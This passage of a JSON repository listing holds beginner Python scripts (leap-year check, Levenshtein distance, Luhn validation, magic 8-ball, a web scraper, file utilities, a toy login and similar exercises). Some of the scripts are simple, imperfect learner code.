        },
        {
          "name": "leap year.py",
          "type": "blob",
          "size": 0.4482421875,
          "content": "# Python program to check if year is a leap year or not\n\nyear = 2000\n\n# To get year (integer input) from the user\n# year = int(input(\"Enter a year: \"))\n\nif (year % 4) == 0:\n   if (year % 100) == 0:\n       if (year % 400) == 0:\n           print(\"{0} is a leap year\".format(year))\n       else:\n           print(\"{0} is not a leap year\".format(year))\n   else:\n       print(\"{0} is a leap year\".format(year))\nelse:\n   print(\"{0} is not a leap year\".format(year))\n"
        },
        {
          "name": "length.py",
          "type": "blob",
          "size": 0.2421875,
          "content": "# User inputs the string and it gets stored in variable str\nstr = input(\"Enter a string: \")\n\n# counter variable to count the character in a string\ncounter = 0\nfor s in str:\n    counter = counter + 1\nprint(\"Length of the input string is:\", counter)\n"
        },
        {
          "name": "letter_frequency.py",
          "type": "blob",
          "size": 0.29296875,
          "content": "# counting the number of occurrences of a letter in a string using defaultdict\n# left space in starting for clarity\nfrom collections import defaultdict\n\ns = \"mississippi\"\nd = defaultdict(int)\nfor k in s:\n    d[k] += 1\nsorted(d.items())\nprint(d)\n\n# OUTPUT --- [('i', 4), ('m', 1), ('p', 2), ('s', 4)]\n"
        },
        {
          "name": "levenshtein_distance.py",
          "type": "blob",
          "size": 1.51171875,
          "content": "def levenshtein_dis(wordA, wordB):\n\n    wordA = wordA.lower()  # making the wordA lower case\n    wordB = wordB.lower()  # making the wordB lower case\n\n    # get the length of the words and defining the variables\n    length_A = len(wordA)\n    length_B = len(wordB)\n    max_len = 0\n    diff = 0\n    distances = []\n    distance = 0\n\n    # check the difference of the word to decide how many letter should be delete or add\n    # also store that value in the 'diff' variable and get the max length of the user given words\n    if length_A > length_B:\n        diff = length_A - length_B\n        max_len = length_A\n    elif length_A < length_B:\n        diff = length_B - length_A\n        max_len = length_B\n    else:\n        diff = 0\n        max_len = length_A\n\n    # starting from the front of the words and compare the letters of the both user given words\n    for x in range(max_len - diff):\n        if wordA[x] != wordB[x]:\n            distance += 1\n\n    # add the 'distance' value to the 'distances' array\n    distances.append(distance)\n    distance = 0\n\n    # starting from the back of the words and compare the letters of the both user given words\n    for x in range(max_len - diff):\n        if wordA[-(x + 1)] != wordB[-(x + 1)]:\n            distance += 1\n\n    # add the 'distance' value to the 'distances' array\n    distances.append(distance)\n\n    # get the minimun value of the 'distances' array and add it with the 'diff' values and\n    # store them in the 'diff' variable\n    diff = diff + min(distances)\n\n    # return the value\n    return diff\n"
        },
        {
          "name": "libs",
          "type": "tree",
          "content": null
        },
        {
          "name": "linear search.py",
          "type": "blob",
          "size": 0.228515625,
          "content": "#Author : ShankRoy\n\ndef linearsearch(arr, x):\n   for i in range(len(arr)):\n      if arr[i] == x:\n         return i\n   return -1\narr = ['t','u','t','o','r','i','a','l']\nx = 'a'\nprint(\"element found at index \"+str(linearsearch(arr,x)))\n"
        },
        {
          "name": "linear-algebra-python",
          "type": "tree",
          "content": null
        },
        {
          "name": "linear_search.py",
          "type": "blob",
          "size": 0.3271484375,
          "content": "num = int(input(\"Enter size of list: \\t\"))\nlist = [int(input(\"Enter any number: \\t\")) for _ in range(num)]\n\nx = int(input(\"\\nEnter number to search: \\t\"))\n\nfor position, number in enumerate(list):\n    if number == x:\n        print(f\"\\n{x} found at position {position}\")\nelse:\n    print(f\"list: {list}\")\n    print(f\"{x} is not in list\")"
        },
        {
          "name": "live_sketch.py",
          "type": "blob",
          "size": 0.4775390625,
          "content": "import cv2\n\n\ndef sketch(image):\n    img_gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n    img_gray_blur = cv2.GaussianBlur(img_gray, (5, 5), 0)\n    canny_edges = cv2.Canny(img_gray_blur, 10, 70)\n    ret, mask = cv2.threshold(canny_edges, 70, 255, cv2.THRESH_BINARY_INV)\n    return mask\n\n\ncap = cv2.VideoCapture(0)\n\nwhile True:\n    ret, frame = cap.read()\n    cv2.imshow(\"Our Live Sketcher\", sketch(frame))\n    if cv2.waitKey(1) == 13:\n        break\n\ncap.release()\ncv2.destroyAllWindows()\n"
        },
        {
          "name": "loader.py",
          "type": "blob",
          "size": 0.7353515625,
          "content": "\"\"\"\nShaurya Pratap Singh \n@shaurya-blip\n\nShows loading message while doing something.\n\"\"\"\n\nimport itertools\nimport threading\nimport time\nimport sys\n\n# The task is not done right now\ndone = False\n\n\ndef animate(message=\"loading\", endmessage=\"Done!\"):\n    for c in itertools.cycle([\"|\", \"/\", \"-\", \"\\\\\"]):\n        if done:\n            break\n        sys.stdout.write(f\"\\r {message}\" + c)\n        sys.stdout.flush()\n        time.sleep(0.1)\n    sys.stdout.write(f\"\\r {endmessage} \")\n\n\nt = threading.Thread(\n    target=lambda: animate(message=\"installing..\", endmessage=\"Installation is done!!!\")\n)\nt.start()\n\n# Code which you are running\n\n\"\"\"\nprogram.install()\n\"\"\"\n\ntime.sleep(10)\n\n# Then mark done as true and thus it will end the loading screen.\ndone = True\n"
        },
        {
          "name": "local_weighted_learning",
          "type": "tree",
          "content": null
        },
        {
          "name": "login.py",
          "type": "blob",
          "size": 1.9306640625,
          "content": "import os\nfrom getpass import getpass\n\n# Devloped By Black_angel\n# This is Logo Function\ndef logo():\n    print(\" ──────────────────────────────────────────────────────── \")\n    print(\" |                                                        | \")\n    print(\" |   ########    ##  #########  ##       ##      ###      | \")\n    print(\" |   ##     ##   ##  ##         ##       ##    ##   ##    | \")\n    print(\" |   ##     ###  ##  ##         ##       ##   ##     ##   | \")\n    print(\" |   ##     ###  ##  #########  ###########  ##########   | \")\n    print(\" |   ##     ###  ##         ##  ##       ##  ##      ##   | \")\n    print(\" |   ##     ##   ##         ##  ##       ##  ##      ##   | \")\n    print(\" |   ########    ##  #########  ##       ##  ##      ##   | \")\n    print(\" |                                                        | \")\n    print(\" \\033[1;91m|   || Digital Information Security Helper Assistant ||  | \")\n    print(\" |                                                        | \")\n    print(\" ──────────────────────────────────────────────────────── \")\n    print(\"\\033[1;36;49m\")\n\n\n# This is Login Function\ndef login():\n    # for clear the screen\n    os.system(\"clear\")\n    print(\"\\033[1;36;49m\")\n    logo()\n    print(\"\\033[1;36;49m\")\n    print(\"\")\n    usr = input(\"Enter your Username : \")\n    # This is username you can change here\n    usr1 = \"raj\"\n    psw = getpass(\"Enter Your Password : \")\n    # This is Password you can change here\n    psw1 = \"5898\"\n    if usr == usr1 and psw == psw1:\n        print(\"\\033[1;92mlogin successfully\")\n        os.system(\"clear\")\n        print(\"\\033[1;36;49m\")\n        logo()\n    else:\n        print(\"\\033[1;91m Wrong\")\n\n        login()\n\n\n# This is main function\nif __name__ == \"__main__\":\n    login()\n"
        },
        {
          "name": "logs.py",
          "type": "blob",
          "size": 1.3642578125,
          "content": "# Script Name   : logs.py\n# Author        : Craig Richards\n# Created       : 13th October 2011\n# Last Modified\t: 14 February 2016\n# Version\t\t: 1.2\n#\n# Modifications\t: 1.1 - Added the variable zip_program so you can set it for the zip program on whichever OS, so to run on a different OS just change the locations of these two variables.\n#               : 1.2 - Tidy up comments and syntax\n#\n# Description   : This script will search for all *.log files in the given directory, zip them using the program you specify and then date stamp them\n\nimport os  # Load the Library Module\nfrom time import strftime  # Load just the strftime Module from Time\n\nlogsdir = \"c:\\puttylogs\"  # Set the Variable logsdir\nzip_program = \"zip.exe\"  # Set the Variable zip_program - 1.1\n\nfor files in os.listdir(logsdir):  # Find all the files in the directory\n    if files.endswith(\".log\"):  # Check to ensure the files in the directory end in .log\n        files1 = (\n            files + \".\" + strftime(\"%Y-%m-%d\") + \".zip\"\n        )  # Create the Variable files1, this is the files in the directory, then we add a suffix with the date and the zip extension\n        os.chdir(logsdir)  # Change directory to the logsdir\n        os.system(\n            zip_program + \" \" + files1 + \" \" + files\n        )  # Zip the logs into dated zip files for each server. - 1.1\n        os.remove(files)  # Remove the original log files\n"
        },
        {
          "name": "longest_increasing_subsequence_length.py",
          "type": "blob",
          "size": 0.55078125,
          "content": "\"\"\"\nAuthor- DIWAKAR JAISWAL\nfind lenth Longest increasing subsequence of given array.\n\"\"\"\n\n\ndef lis(a):\n    n = len(a)\n    # initialize ans array same lenth as 1\n    ans = [1] * n\n    for i in range(1, n):\n        # now compare with first index to that index\n        for j in range(i):\n            if a[i] > a[j] and ans[i] < ans[j] + 1:\n                ans[i] = ans[j] + 1\n    return max(ans)\n\n\na = [1, 3, 2, 6, 4]\n\n# longest increasing subsequence=[{1<3<6},{1<3<4},{1<2<6},{1<2<4}] length is 3\n\nprint(\"Maximum Length of longest increasing subsequence \", lis(a))\n"
        },
        {
          "name": "love_turtle.py",
          "type": "blob",
          "size": 0.4296875,
          "content": "import turtle\n\n\ndef heart_red():\n    t = turtle.Turtle()\n    turtle.title(\"I Love You\")\n    screen = turtle.Screen()\n    screen.bgcolor(\"white\")\n    t.color(\"red\")\n    t.begin_fill()\n    t.fillcolor(\"red\")\n\n    t.left(140)\n    t.forward(180)\n    t.circle(-90, 200)\n\n    t.setheading(60)  # t.left\n    t.circle(-90, 200)\n    t.forward(180)\n\n    t.end_fill()\n    t.hideturtle()\n\n    turtle.done()\n\n\nif __name__ == \"__main__\":\n    heart_red()\n"
        },
        {
          "name": "luhn_algorithm_for_credit_card_validation.py",
          "type": "blob",
          "size": 1.1103515625,
          "content": "\"\"\"\nThe Luhn Algorithm is widely used for error-checking in various applications, such as verifying credit card numbers.\n\nBy building this project, you'll gain experience working with numerical computations and string manipulation.\n\n\"\"\"\n\n# TODO: To make it much more better and succint\n\n\ndef verify_card_number(card_number):\n    sum_of_odd_digits = 0\n    card_number_reversed = card_number[::-1]\n    odd_digits = card_number_reversed[::2]\n\n    for digit in odd_digits:\n        sum_of_odd_digits += int(digit)\n\n    sum_of_even_digits = 0\n    even_digits = card_number_reversed[1::2]\n    for digit in even_digits:\n        number = int(digit) * 2\n        if number >= 10:\n            number = (number // 10) + (number % 10)\n        sum_of_even_digits += number\n    total = sum_of_odd_digits + sum_of_even_digits\n    return total % 10 == 0\n\n\ndef main():\n    card_number = \"4111-1111-4555-1142\"\n    card_translation = str.maketrans({\"-\": \"\", \" \": \"\"})\n    translated_card_number = card_number.translate(card_translation)\n\n    if verify_card_number(translated_card_number):\n        print(\"VALID!\")\n    else:\n        print(\"INVALID!\")\n\n\nmain()\n"
        },
        {
          "name": "magic8ball.py",
          "type": "blob",
          "size": 1.3427734375,
          "content": "import random\nfrom colorama import Fore, Style\nimport inquirer\n\nresponses = [\n    \"It is certain\",\n    \"It is decidedly so\",\n    \"Without a doubt\",\n    \"Yes definitely\",\n    \"You may rely on it\",\n    \"As I see it, yes\",\n    \"Most likely\",\n    \"Outlook good\",\n    \"Yes\",\n    \"Signs point to yes\",\n    \"Do not count on it\",\n    \"My reply is no\",\n    \"My sources say no\",\n    \"Outlook not so good\",\n    \"Very doubtful\",\n    \"Reply hazy try again\",\n    \"Ask again later\",\n    \"Better not tell you now\",\n    \"Cannot predict now\",\n    \"Concentrate and ask again\",\n]\n\n\n# Will use a class on it.\n# Will try to make it much more better.\ndef get_user_name():\n    return inquirer.text(\n        message=\"Hi! I am the magic 8 ball, what's your name?\"\n    ).execute()\n\n\ndef display_greeting(name):\n    print(f\"Hello, {name}!\")\n\n\ndef magic_8_ball():\n    question = inquirer.text(message=\"What's your question?\").execute()\n    answer = random.choice(responses)\n    print(Fore.BLUE + Style.BRIGHT + answer + Style.RESET_ALL)\n    try_again()\n\n\ndef try_again():\n    response = inquirer.list_input(\n        message=\"Do you want to ask more questions?\",\n        choices=[\"Yes\", \"No\"],\n    ).execute()\n\n    if response.lower() == \"yes\":\n        magic_8_ball()\n    else:\n        exit()\n\n\nif __name__ == \"__main__\":\n    user_name = get_user_name()\n    display_greeting(user_name)\n    magic_8_ball()\n"
        },
        {
          "name": "magic_8_ball.py",
          "type": "blob",
          "size": 1.3427734375,
          "content": "import random\nfrom colorama import Fore, Style\nimport inquirer\n\nresponses = [\n    \"It is certain\",\n    \"It is decidedly so\",\n    \"Without a doubt\",\n    \"Yes definitely\",\n    \"You may rely on it\",\n    \"As I see it, yes\",\n    \"Most likely\",\n    \"Outlook good\",\n    \"Yes\",\n    \"Signs point to yes\",\n    \"Do not count on it\",\n    \"My reply is no\",\n    \"My sources say no\",\n    \"Outlook not so good\",\n    \"Very doubtful\",\n    \"Reply hazy try again\",\n    \"Ask again later\",\n    \"Better not tell you now\",\n    \"Cannot predict now\",\n    \"Concentrate and ask again\",\n]\n\n\n# Will use a class on it.\n# Will try to make it much more better.\ndef get_user_name():\n    return inquirer.text(\n        message=\"Hi! I am the magic 8 ball, what's your name?\"\n    ).execute()\n\n\ndef display_greeting(name):\n    print(f\"Hello, {name}!\")\n\n\ndef magic_8_ball():\n    question = inquirer.text(message=\"What's your question?\").execute()\n    answer = random.choice(responses)\n    print(Fore.BLUE + Style.BRIGHT + answer + Style.RESET_ALL)\n    try_again()\n\n\ndef try_again():\n    response = inquirer.list_input(\n        message=\"Do you want to ask more questions?\",\n        choices=[\"Yes\", \"No\"],\n    ).execute()\n\n    if response.lower() == \"yes\":\n        magic_8_ball()\n    else:\n        exit()\n\n\nif __name__ == \"__main__\":\n    user_name = get_user_name()\n    display_greeting(user_name)\n    magic_8_ball()\n"
        },
        {
          "name": "mapit.py",
          "type": "blob",
          "size": 0.2734375,
          "content": "import sys, webbrowser, pyperclip\r\n\r\nif len(sys.argv) > 1:\r\n    address = \" \".join(sys.argv[1:])\r\n\r\nelif len(pyperclip.paste()) > 2:\r\n    address = pyperclip.paste()\r\nelse:\r\n    address = input(\"enter your palce\")\r\nwebbrowser.open(\"https://www.google.com/maps/place/\" + address)\r\n"
        },
        {
          "name": "mathfunctions",
          "type": "blob",
          "size": 0.0556640625,
          "content": "x = min(65, 90, 65)\ny = max(2, 8, 10)\n\nprint(x)\nprint(y)\n"
        },
        {
          "name": "meme_maker.py",
          "type": "blob",
          "size": 1.5869140625,
          "content": "import sys\n\nfrom PIL import ImageDraw, ImageFont, Image\n\n\ndef input_par():\n    print(\"Enter the text to insert in image: \")\n    text = str(input())\n    print(\"Enter the desired size of the text: \")\n    size = int(input())\n    print(\"Enter the color for the text(r, g, b): \")\n    color_value = [int(i) for i in input().split(\" \")]\n    return text, size, color_value\n    pass\n\n\ndef main():\n    path_to_image = sys.argv[1]\n    image_file = Image.open(path_to_image + \".jpg\")\n    image_file = image_file.convert(\"RGBA\")\n    pixdata = image_file.load()\n\n    print(image_file.size)\n    text, size, color_value = input_par()\n\n    # Font path is given as -->( \" Path  to  your  desired  font \" )\n    font = ImageFont.truetype(\"C:\\\\Windows\\\\Fonts\\\\Arial.ttf\", size=size)\n\n    # If the color of the text is not equal to white,then change the background to be white\n    if (color_value[0] and color_value[1] and color_value[2]) != 255:\n        for y in range(100):\n            for x in range(100):\n                pixdata[x, y] = (255, 255, 255, 255)\n    # If the text color is white then the background is said to be black\n    else:\n        for y in range(100):\n            for x in range(100):\n                pixdata[x, y] = (0, 0, 0, 255)\n    image_file.show()\n\n    # Drawing text on the picture\n    draw = ImageDraw.Draw(image_file)\n    draw.text(\n        (0, 2300), text, (color_value[0], color_value[1], color_value[2]), font=font\n    )\n    draw = ImageDraw.Draw(image_file)\n\n    print(\"Enter the file name: \")\n    file_name = str(input())\n    image_file.save(file_name + \".jpg\")\n    pass\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "memorygame.py",
          "type": "blob",
          "size": 1.474609375,
          "content": "from random import *\nfrom turtle import *\nfrom freegames import path\n\ncar = path(\"car.gif\")\ntiles = list(range(32)) * 2\nstate = {\"mark\": None}\nhide = [True] * 64\n\n\ndef square(x, y):\n    \"Draw white square with black outline at (x, y).\"\n    up()\n    goto(x, y)\n    down()\n    color(\"black\", \"white\")\n    begin_fill()\n    for count in range(4):\n        forward(50)\n        left(90)\n    end_fill()\n\n\ndef index(x, y):\n    \"Convert (x, y) coordinates to tiles index.\"\n    return int((x + 200) // 50 + ((y + 200) // 50) * 8)\n\n\ndef xy(count):\n    \"Convert tiles count to (x, y) coordinates.\"\n    return (count % 8) * 50 - 200, (count // 8) * 50 - 200\n\n\ndef tap(x, y):\n    \"Update mark and hidden tiles based on tap.\"\n    spot = index(x, y)\n    mark = state[\"mark\"]\n\n    if mark is None or mark == spot or tiles[mark] != tiles[spot]:\n        state[\"mark\"] = spot\n    else:\n        hide[spot] = False\n        hide[mark] = False\n        state[\"mark\"] = None\n\n\ndef draw():\n    \"Draw image and tiles.\"\n    clear()\n    goto(0, 0)\n    shape(car)\n    stamp()\n\n    for count in range(64):\n        if hide[count]:\n            x, y = xy(count)\n            square(x, y)\n\n    mark = state[\"mark\"]\n\n    if mark is not None and hide[mark]:\n        x, y = xy(mark)\n        up()\n        goto(x + 2, y)\n        color(\"black\")\n        write(tiles[mark], font=(\"Arial\", 30, \"normal\"))\n\n    update()\n    ontimer(draw, 100)\n\n\nshuffle(tiles)\nsetup(420, 420, 370, 0)\naddshape(car)\nhideturtle()\ntracer(False)\nonscreenclick(tap)\ndraw()\ndone()\n"
        },
        {
          "name": "merge.py",
          "type": "blob",
          "size": 1.0009765625,
          "content": "from __future__ import print_function\n\nimport os\n\n# author:zhangshuyx@gmail.com\n# !/usr/bin/env python\n# -*- coding=utf-8 -*-\n\n# define the result filename\nresultfile = \"result.csv\"\n\n\n# the merge func\ndef merge():\n    \"\"\"merge csv files to one file\"\"\"\n\n    # indicates use of a global variable.\n    global resultfile\n\n    # use list save the csv files\n    csvfiles = [\n        f\n        for f in os.listdir(\".\")\n        if f != resultfile and (len(f.split(\".\")) >= 2) and f.split(\".\")[1] == \"csv\"\n    ]\n\n    # open file to write\n    with open(resultfile, \"w\") as writefile:\n        for csvfile in csvfiles:\n            with open(csvfile) as readfile:\n                print(\"File {} readed.\".format(csvfile))\n\n                # do the read and write\n                writefile.write(readfile.read() + \"\\n\")\n    print(\"\\nFile {} wrote.\".format(resultfile))\n\n\n# the main program\n\n\ndef main():\n    print(\"\\t\\tMerge\\n\\n\")\n    print(\"This program merges csv-files to one file\\n\")\n    merge()\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "missing number from list.py",
          "type": "blob",
          "size": 0.2431640625,
          "content": "# program to find a missing number from a list.\n\n\ndef missing_number(num_list):\n    return sum(range(num_list[0], num_list[-1] + 1)) - sum(num_list)\n\n\nprint(missing_number([1, 2, 3, 4, 6, 7, 8]))\n\nprint(missing_number([10, 11, 12, 14, 15, 16, 17]))\n"
        },
        {
          "name": "mobilePhoneSpecsScrapper.py",
          "type": "blob",
          "size": 4.4228515625,
          "content": "import requests\nfrom bs4 import BeautifulSoup\n\n# import csv\nimport os\n\n# import time\nimport json\n\n\nclass Phonearena:\n    def __init__(self):\n        self.phones = []\n        self.features = [\"Brand\", \"Model Name\", \"Model Image\"]\n        self.temp1 = []\n        self.phones_brands = []\n        self.url = \"https://www.phonearena.com/phones/\"  # GSMArena website url\n        # Folder name on which files going to save.\n        self.new_folder_name = \"GSMArenaDataset\"\n        # It create the absolute path of the GSMArenaDataset folder.\n        self.absolute_path = os.getcwd().strip() + \"/\" + self.new_folder_name\n\n    def crawl_html_page(self, sub_url):\n\n        url = sub_url  # Url for html content parsing.\n\n        # Handing the connection error of the url.\n        try:\n            page = requests.get(url)\n            # It parses the html data from requested url.\n            soup = BeautifulSoup(page.text, \"html.parser\")\n            return soup\n\n        except ConnectionError as err:\n            print(\"Please check your network connection and re-run the script.\")\n            exit()\n\n        except Exception:\n            print(\"Please check your network connection and re-run the script.\")\n            exit()\n\n    def crawl_phone_urls(self):\n        phones_urls = []\n        for i in range(1, 238):  # Right now they have 237 page of phone data.\n            print(self.url + \"page/\" + str(i))\n            soup = self.crawl_html_page(self.url + \"page/\" + str(i))\n            table = soup.findAll(\"div\", {\"class\": \"stream-item\"})\n            table_a = [k.find(\"a\") for k in table]\n            for a in table_a:\n                temp = a[\"href\"]\n                phones_urls.append(temp)\n        return phones_urls\n\n    def crawl_phones_models_specification(self, li):\n        phone_data = {}\n        for link in li:\n            print(link)\n            try:\n                soup = self.crawl_html_page(link)\n                model = soup.find(class_=\"page__section page__section_quickSpecs\")\n                model_name = model.find(\"header\").h1.text\n                model_img_html = model.find(class_=\"head-image\")\n                model_img = model_img_html.find(\"img\")[\"data-src\"]\n                specs_html = model.find(\n                    class_=\"phone__section phone__section_widget_quickSpecs\"\n                )\n                release_date = specs_html.find(class_=\"calendar\")\n                release_date = release_date.find(class_=\"title\").p.text\n                display = specs_html.find(class_=\"display\")\n                display = display.find(class_=\"title\").p.text\n                camera = specs_html.find(class_=\"camera\")\n                camera = camera.find(class_=\"title\").p.text\n                hardware = specs_html.find(class_=\"hardware\")\n                hardware = hardware.find(class_=\"title\").p.text\n                storage = specs_html.find(class_=\"storage\")\n                storage = storage.find(class_=\"title\").p.text\n                battery = specs_html.find(class_=\"battery\")\n                battery = battery.find(class_=\"title\").p.text\n                os = specs_html.find(class_=\"os\")\n                os = os.find(class_=\"title\").p.text\n                phone_data[model_name] = {\n                    \"image\": model_img,\n                    \"release_date\": release_date,\n                    \"display\": display,\n                    \"camera\": camera,\n                    \"hardware\": hardware,\n                    \"storage\": storage,\n                    \"battery\": battery,\n                    \"os\": os,\n                }\n                with open(obj.absolute_path + \"-PhoneSpecs.json\", \"w+\") as of:\n                    json.dump(phone_data, of)\n            except Exception as error:\n                print(f\"Exception happened : {error}\")\n                continue\n        return phone_data\n\n\nif __name__ == \"__main__\":\n    obj = Phonearena()\n    try:\n        # Step 1: Scrape links to all the individual phone specs page and save it so that we don't need to run it again.\n        phone_urls = obj.crawl_phone_urls()\n        with open(obj.absolute_path + \"-Phoneurls.json\", \"w\") as of:\n            json.dump(phone_urls, of)\n\n        # Step 2: Iterate through all the links from the above execution and run the next command\n        with open(\"obj.absolute_path+'-Phoneurls.json\", \"r\") as inp:\n            temp = json.load(inp)\n            phone_specs = obj.crawl_phones_models_specification(temp)\n\n    except KeyboardInterrupt:\n        print(\"File has been stopped due to KeyBoard Interruption.\")\n"
        },
        {
          "name": "move_files_over_x_days.py",
          "type": "blob",
          "size": 1.9267578125,
          "content": "# Script Name   : move_files_over_x_days.py\r\n# Author(s)     : Craig Richards ,Demetrios Bairaktaris\r\n# Created       : 8th December 2011\r\n# Last Modified : 25 December 2017\r\n# Version       : 1.1\r\n# Modifications : Added possibility to use command line arguments to specify source, destination, and days.\r\n# Description   : This will move all the files from the src directory that are over 240 days old to the destination directory.\r\n\r\nimport argparse\r\nimport os\r\nimport shutil\r\nimport time\r\n\r\nusage = \"python move_files_over_x_days.py -src [SRC] -dst [DST] -days [DAYS]\"\r\ndescription = \"Move files from src to dst if they are older than a certain number of days.  Default is 240 days\"\r\n\r\nargs_parser = argparse.ArgumentParser(usage=usage, description=description)\r\nargs_parser.add_argument(\r\n    \"-src\",\r\n    \"--src\",\r\n    type=str,\r\n    nargs=\"?\",\r\n    default=\".\",\r\n    help=\"(OPTIONAL) Directory where files will be moved from. Defaults to current directory\",\r\n)\r\nargs_parser.add_argument(\r\n    \"-dst\",\r\n    \"--dst\",\r\n    type=str,\r\n    nargs=\"?\",\r\n    required=True,\r\n    help=\"(REQUIRED) Directory where files will be moved to.\",\r\n)\r\nargs_parser.add_argument(\r\n    \"-days\",\r\n    \"--days\",\r\n    type=int,\r\n    nargs=\"?\",\r\n    default=240,\r\n    help=\"(OPTIONAL) Days value specifies the minimum age of files to be moved. Default is 240.\",\r\n)\r\nargs = args_parser.parse_args()\r\n\r\nif args.days < 0:\r\n    args.days = 0\r\n\r\nsrc = args.src  # Set the source directory\r\ndst = args.dst  # Set the destination directory\r\ndays = args.days  # Set the number of days\r\nnow = time.time()  # Get the current time\r\n\r\nif not os.path.exists(dst):\r\n    os.mkdir(dst)\r\n\r\nfor f in os.listdir(src):  # Loop through all the files in the source directory\r\n    if (\r\n        os.stat(f).st_mtime < now - days * 86400\r\n    ):  # Work out how old they are, if they are older than 240 days old\r\n        if os.path.isfile(f):  # Check it's a file\r\n            shutil.move(f, dst)  # Move the files\r\n"
        },
        {
          "name": "movie_details.py",
          "type": "blob",
          "size": 1.5712890625,
          "content": "import urllib.request\n\nimport mechanize\nfrom bs4 import BeautifulSoup\n\n# Create a Browser\nbrowser = mechanize.Browser()\n\n# Disable loading robots.txt\nbrowser.set_handle_robots(False)\n\nbrowser.addheaders = [(\"User-agent\", \"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)\")]\n\nmovie_title = input(\"Enter movie title: \")\n\nmovie_types = (\n    \"feature\",\n    \"tv_movie\",\n    \"tv_series\",\n    \"tv_episode\",\n    \"tv_special\",\n    \"tv_miniseries\",\n    \"documentary\",\n    \"video_game\",\n    \"short\",\n    \"video\",\n    \"tv_short\",\n)\n\n# Navigate\nbrowser.open(\"http://www.imdb.com/search/title\")\n\n# Choose a form\nbrowser.select_form(nr=1)\n\nbrowser[\"title\"] = movie_title\n\n# Check all the boxes of movie types\nfor m_type in movie_types:\n    browser.find_control(type=\"checkbox\", nr=0).get(m_type).selected = True\n\n# Submit\nfd = browser.submit()\nsoup = BeautifulSoup(fd.read(), \"html5lib\")\n\n# Updated from td tag to h3 tag\nfor div in soup.findAll(\"h3\", {\"class\": \"lister-item-header\"}, limit=1):\n    a = div.findAll(\"a\")[0]\n    hht = \"http://www.imdb.com\" + a.attrs[\"href\"]\n    print(hht)\n    page = urllib.request.urlopen(hht)\n    soup2 = BeautifulSoup(page.read(), \"html.parser\")\n    find = soup2.find\n\n    print(\"Title: \" + find(itemprop=\"name\").get_text().strip())\n    print(\"Duration: \" + find(itemprop=\"duration\").get_text().strip())\n    print(\"Director: \" + find(itemprop=\"director\").get_text().strip())\n    print(\"Genre: \" + find(itemprop=\"genre\").get_text().strip())\n    print(\"IMDB rating: \" + find(itemprop=\"ratingValue\").get_text().strip())\n    print(\"Summary: \" + find(itemprop=\"description\").get_text().strip())\n"
        },
        {
          "name": "multiplication_table.py",
          "type": "blob",
          "size": 0.6865234375,
          "content": "\"\"\"\nThe 'multiplication table' Implemented in Python 3\n\nSyntax:\npython3 multiplication_table.py [rows columns]\nSeparate filenames with spaces as usual.\n\nUpdated by Borys Baczewski (BB_arbuz on GitHub) - 06/03/2022\n\"\"\"\n\nfrom sys import argv  # import argument variable\n\n(\n    script,\n    rows,\n    columns,\n) = argv  # define rows and columns for the table and assign them to the argument variable\n\n\ndef table(rows, columns):\n    columns = int(columns)\n    rows = int(rows)\n    for r in range(1, rows+1):\n        c = r\n        print(r, end='\\t')\n        i = 0\n        while columns-1 > i:\n            print(c+r, end='\\t')\n            c = c+r\n            i += 1\n        print('\\n')\n\n\ntable(rows, columns)\n"
        },
        {
          "name": "my project",
          "type": "blob",
          "size": 1.095703125,
          "content": "# Program make a simple calculator\n\n# This function adds two numbers\ndef add(x, y):\n    return x + y\n\n# This function subtracts two numbers\ndef subtract(x, y):\n    return x - y\n\n# This function multiplies two numbers\ndef multiply(x, y):\n    return x * y\n\n# This function divides two numbers\ndef divide(x, y):\n    return x / y\n\n\nprint(\"Select operation.\")\nprint(\"1.Add\")\nprint(\"2.Subtract\")\nprint(\"3.Multiply\")\nprint(\"4.Divide\")\n\nwhile True:\n    # Take input from the user\n    choice = input(\"Enter choice(1/2/3/4): \")\n\n    # Check if choice is one of the four options\n    if choice in ('1', '2', '3', '4'):\n        num1 = float(input(\"Enter first number: \"))\n        num2 = float(input(\"Enter second number: \"))\n\n        if choice == '1':\n            print(num1, \"+\", num2, \"=\", add(num1, num2))\n\n        elif choice == '2':\n            print(num1, \"-\", num2, \"=\", subtract(num1, num2))\n\n        elif choice == '3':\n            print(num1, \"*\", num2, \"=\", multiply(num1, num2))\n\n        elif choice == '4':\n            print(num1, \"/\", num2, \"=\", divide(num1, num2))\n        break\n    else:\n        print(\"Invalid Input\")\n"
        },
        {
          "name": "nDigitNumberCombinations.py",
          "type": "blob",
          "size": 0.4462890625,
          "content": "# ALL the combinations of n digit combo\ndef nDigitCombinations(n):\n    try:\n        npow = 10 ** n\n        numbers = []\n        for code in range(npow):\n            code = str(code).zfill(n)\n            numbers.append(code)\n    except Exception:\n        # handle all other exceptions\n        pass\n    return numbers\n\n\n# An alternate solution:\n# from itertools import product\n# from string import digits\n# list(\"\".join(x) for x in product(digits, repeat=n))\n"
        },
        {
          "name": "nasa_apod_with_requests",
          "type": "tree",
          "content": null
        },
        {
          "name": "new.py",
          "type": "blob",
          "size": 0.13671875,
          "content": "def hello_world():\n    \"\"\"\n    Prints a greeting message.\n    \"\"\"\n    print(\"Hello, world!\")\n\n\nif __name__ == \"__main__\":\n    hello_world()\n"
        },
        {
          "name": "new_pattern.py",
          "type": "blob",
          "size": 0.466796875,
          "content": "#pattern\n#@@@@@@@@    $\n#@@@@@@@    $$\n#@@@@@@    $$$\n#@@@@@    $$$$\n#@@@@    $$$$$\n#@@@    $$$$$$\n#@@    $$$$$$$\n#@    $$$$$$$$\n\ndef main():\n    lines = int(input(\"Enter no.of lines: \"))\n    pattern(lines)\n\ndef pattern(lines): \n     t = 1 \n     for i in range(lines,0,-1): \n         nxt_pattern = \"$\"*t \n         pattern = \"@\"*(i) \n         final_pattern = pattern + \"    \" + nxt_pattern \n         print(final_pattern) \n         t = t +1\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "new_script.py",
          "type": "blob",
          "size": 1.947265625,
